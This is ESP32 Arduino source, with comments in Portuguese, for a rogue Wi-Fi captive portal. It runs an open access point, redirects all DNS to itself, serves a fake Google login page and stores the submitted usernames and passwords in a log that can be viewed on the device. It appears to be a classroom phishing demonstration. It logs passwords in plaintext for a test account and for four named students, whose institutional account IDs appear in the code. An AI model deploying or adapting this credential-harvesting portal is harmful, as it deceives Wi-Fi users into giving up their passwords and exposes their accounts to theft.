#include <SPIFFS.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ESPmDNS.h>
#include <FS.h>

#include "google.h"
#include "facebook.h"
#include "instagram.h"
#include "erro.h"
#include "final.h"

#define LOGFILE "/log.txt"
#define RESPOSTASFILE "/respostas.txt"

// Ponto de acesso
const char *ssid = "MUNDO_SENAI_WIFI";

// Páginas HTML
#define captivePortalPage GOOGLE_HTML
#define erroPage FAKE_FORM_HTML
#define finalPage FAKE_FORM_RESULT_HTML

// Rede
const byte DNS_PORT = 53;
IPAddress apIP(200, 200, 200, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
WebServer server(80);

// Buffers
String webString = "";
String serialString = "";

// Pisca o LED
void blink(int n) {
  for (int i = 0; i < n; i++) {
    digitalWrite(15, LOW);
    delay(250);
    digitalWrite(15, HIGH);
    delay(250);
  }
}

// Página principal
void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(200, "text/html", captivePortalPage);
}

void setup() {
  Serial.begin(9600);
  Serial.println("ESP32captive(1.5)");

  pinMode(15, OUTPUT);
  digitalWrite(15, HIGH);

  // Inicializar SPIFFS
  Serial.print("Inicializando SPIFFS...");
  if (!SPIFFS.begin()) {
    Serial.println("Falha ao montar SPIFFS.");
    return;
  }
  Serial.println("Sucesso!");

  // Verifica e cria arquivos de log e respostas
  if (!SPIFFS.exists(LOGFILE)) {
    File f = SPIFFS.open(LOGFILE, "w");
    if (f) {
      f.println("Credenciais de login capturadas:");
      f.close();
    }
  }

  if (!SPIFFS.exists(RESPOSTASFILE)) {
    File f = SPIFFS.open(RESPOSTASFILE, "w");
    if (f) {
      f.println("Respostas do formulário:");
      f.close();
    }
  }

  // Criar AP
  Serial.print("Criando AP...");
  WiFi.mode(WIFI_AP);
  delay(1000);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  Serial.println(" OK");

  // DNS
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  // Roteamento principal
  server.on("/", handleRoot);
  server.on("/generate_204", handleRoot);
  server.on("/fwlink", handleRoot);
  server.onNotFound(handleRoot);

  // Valida e salva login
  server.on("/validate", []() {
    String user = server.arg("user");
    String pass = server.arg("pass");

    if (user.equals("teste@mundosenai.com")) {
      serialString = user + ":" + pass;
    } else {
      serialString = user + ":" + " SUA SENHA AQUI ";
    }

    Serial.println(serialString);

    File f = SPIFFS.open(LOGFILE, "a");
    if (f) {
      f.print("Login: ");
      f.print(user);
      f.print(" | Senha: ");
      if (user.equals("teste@mundosenai.com")) {
        f.println(pass);
      } 
      else if (user.equals("0000511951@senaimgaluno.com.br")){
        f.println(pass + "   ✌🏽"); // Wellington
      }
      else if (user.equals("0001064889@senaimgaluno.com.br")){
        f.println(pass + "  🤪"); // Heverty
      }
      else if (user.equals("0000962582@senaimgaluno.com.br")){
        f.println(pass + "  😎"); // Gabriel
      }
      else if (user.equals("0000736136@senaimgaluno.com.br")){
        f.println(pass + "  👷🏽"); // Lívia
      }
      else {
        f.println(" SUA SENHA AQUI ");
      }
      f.close();
    }

    server.send(500, "text/html", erroPage);
    blink(2);
  });

  // Captura respostas do formulário
  server.on("/final", []() {
    String pergunta1 = server.arg("pergunta1");
    String pergunta2 = server.arg("pergunta2");
    String pergunta3 = server.arg("pergunta3");
    String pergunta4 = server.arg("pergunta4");
    String pergunta5 = server.arg("pergunta5");
    String pergunta6 = server.arg("pergunta6");
    String resposta_aberta = server.arg("resposta_aberta");
    String nome = server.arg("nome");
    String turma = server.arg("turma");

    File f = SPIFFS.open(RESPOSTASFILE, "a");
    if (f) {
      f.println("Resposta recebida:");
      f.println("Pergunta 1: " + pergunta1);
      f.println("Pergunta 2: " + pergunta2);
      f.println("Pergunta 3: " + pergunta3);
      f.println("Pergunta 4: " + pergunta4);
      f.println("Pergunta 5: " + pergunta5);
      f.println("Pergunta 6: " + pergunta6);
      f.println("Resposta aberta: " + resposta_aberta);
      f.println("Nome: " + nome);
      f.println("Turma: " + turma);
      f.println("-------------------------");
      f.close();
    }

    server.send(200, "text/html", finalPage);
    blink(2);
  });

 
  // Página de logs
  server.on("/logs", []() {
    webString = "<html><head><meta charset='UTF-8'></head><body>";
    
    // Título centralizado e maior
    webString += "<h1 style='"
              "text-align:center;"
              "font-size:45px;"
              "background-color:#3284d6;"       // Azul mundo senai
              "color:white;"                    // Texto branco
              "padding:20px;"
              "border-radius:15px;"
              "box-shadow: 0 4px 10px rgba(0,0,0,0.3);"
              "font-family:Arial, sans-serif;"
              "margin-bottom: 30px;"
              "'>"
              "Logs de Login"
              "</h1>";

    
    // Início do bloco de logs com fonte maior
    webString += "<pre style='font-size: 35px;'>";

    File f = SPIFFS.open(LOGFILE, "r");
    if (f) {
      while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim(); // Remove espaços e \r \n extras

        if (line == "Credenciais de login capturadas:") {
          webString += "<span style='color:black; font-weight:bold;'>" + line + "</span>\n\n";
        }
        else if (line.indexOf("teste@mundosenai.com") >= 0) {
          webString += "<span style='color:#fe2259; font-weight:bold;'>" + line + "</span>\n";
        }
        else if (line.indexOf("0000962582@senaimgaluno.com.br") >= 0) {
          webString += "<span style='color:#0b228a; font-weight:bold;'>" + line + "</span>\n";
        } // Gabriel
        else if (line.indexOf("0000736136@senaimgaluno.com.br") >= 0) {
          webString += "<span style='color:#0c8783; font-weight:bold;'>" + line + "</span>\n";
        } // Lívia
        else if (line.indexOf("0001064889@senaimgaluno.com.br") >= 0) {
          webString += "<span style='color:#d6620f; font-weight:bold;'>" + line + "</span>\n";
        } // Heverty
        else if (line.indexOf("0000511951@senaimgaluno.com.br") >= 0) {
          webString += "<span style='color:#0b8a0f; font-weight:bold;'>" + line + "</span>\n";
        } // Wellington
        else {
          webString += line + "\n";
        }
      }
      f.close();
    } else {
      webString += "Nenhum log encontrado.";
    }

    webString += "</pre>";

    // Botão para limpar os logs
    webString += "<form action='/logs/clear' method='GET' style='text-align:center; margin-top:20px;'>";
    webString += "<button type='submit' style='font-size:20px;'>Limpar Logs</button>";
    webString += "</form>";

    webString += "</body></html>";

    server.send(200, "text/html", webString);
  });



  // Página de respostas
  server.on("/respostas", []() {
    webString = "<html><head><meta charset='UTF-8'></head><body>";
    webString += "<h1>Respostas do Formulário</h1><pre>";

    File f = SPIFFS.open(RESPOSTASFILE, "r");
    if (f) {
      serialString = f.readString();
      webString += serialString;
      f.close();
    } else {
      webString += "Nenhuma resposta encontrada.";
    }
    webString += "</pre>";

    // Botão para limpar as respostas
    webString += "<form action='/respostas/clear' method='GET'>";
    webString += "<button type='submit'>Limpar Respostas</button>";
    webString += "</form>";

    webString += "</body></html>";
    server.send(200, "text/html", webString);
  });



  // Limpa logs
  server.on("/logs/clear", []() {
    File f = SPIFFS.open(LOGFILE, "w");
    f.println("Credenciais de login capturadas:");
    f.close();
    server.send(200, "text/html", "<html><body><h1>Logs limpos</h1></body></html>");
  });

  // Limpa logs
  server.on("/logs/clear", []() {
    File f = SPIFFS.open(LOGFILE, "w");
    f.println("Credenciais de login capturadas:");
    f.close();
    server.send(200, "text/html", "<html><body><h1>Logs limpos</h1></body></html>");
  });


  // Limpa respostas
  server.on("/respostas/clear", []() {
    File f = SPIFFS.open(RESPOSTASFILE, "w");
    f.println("Respostas do formulário:");
    f.close();
    server.send(200, "text/html", "<html><body><h1>Respostas limpas</h1></body></html>");
  });



  // Inicia o servidor
  server.begin();
  Serial.println("Servidor iniciado!");
  blink(1);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
